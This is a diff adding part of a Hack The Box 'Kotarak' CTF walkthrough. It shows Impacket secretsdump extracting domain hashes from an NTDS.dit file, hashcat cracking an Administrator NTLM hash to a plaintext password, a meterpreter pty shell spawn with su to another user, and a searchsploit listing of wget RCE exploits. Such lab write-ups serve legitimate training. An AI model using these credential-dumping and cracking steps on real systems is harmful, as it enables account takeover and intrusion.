@@ -167,6 +167,93 @@ Lets download both the files into our machine and rename them to something simpl
 There is a nice writeup on how we can extract data from .dit files [here](https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/)
 
 
+Lets use the all great Impacket !!
+
+Install all the dependencies and it should work. If any errors or the output isnt right, there is also a manual way of doing it on the link above which works perfectly fine.
+
+After running secretsdump.py we get something like this
+```
+root@kali:~/hackthebox/Machines/Kotarak/writeup/impacket/examples# python secretsdump.py -ntds ../../kotarak.dit -system ../../kotarak.bin LOCAL
+Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
+
+[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
+[*] Reading and decrypting hashes from ../../kotarak.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+..
+..
+..
+```
+
+Lets hascat that
+```
+.\hashcat64.exe -m 1000 .\hash.txt --username .\rockyou.txt
+e64fe0f24ba2489c05e64354d74ebd11:f16tomcat!
+```
+
+Seems legit F16 
+
+Lets get a shell on meterpreter and try to su as the user
+
+We check `/etc/passwd` and we find that the username is atanas
+
+```
+meterpreter > shell
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ su atanas
+su atanas
+Password: f16tomcat!
+
+atanas@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ whoami
+whoami
+atanas
+
+```
+
+***user.txt***
+```
+atanas@kotarak-dmz:~$ cat user.txt
+cat user.txt
+93f844f50491ef797c9c1b601b4bece8
+```
+
+The root folder has 2 files and they are actually readable, checking them out
+
+```
+atanas@kotarak-dmz:/root$ls -l
+ls -l
+total 8
+-rw------- 1 atanas root 333 Jul 20 22:53 app.log
+-rw------- 1 atanas root  66 Aug 29 11:36 flag.txt
+atanas@kotarak-dmz:/root$ cat flag.txt
+cat flag.txt
+Getting closer! But what you are looking for can't be found here.
+atanas@kotarak-dmz:/root$ cat app.log
+cat app.log
+10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+```
+
+It looks like there is something else on the network at ```10.0.3.133```
+
+Checking ifconfig shows that we are connected to another network and our local ip for that network is ```10.0.3.1```
+
+We also see the wget version and its old af
+```
+root@kali:~/hackthebox/Machines/Kotarak# searchsploit wget 1.1
+```
+
+| Exploit Title                                                   |  Path                       |
+|:-------------------------:                                      |:-------------------------:  |
+|GNU Wget < 1.18 - Access List Bypass / Race Condition            | multiple/remote/40824.py    |
+|GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution  | linux/remote/40064.txt      |
+|wget 1.10.2 - (Unchecked Boundary Condition) Denial of Service   | multiple/dos/2947.pl        |
+
+
 
 
 
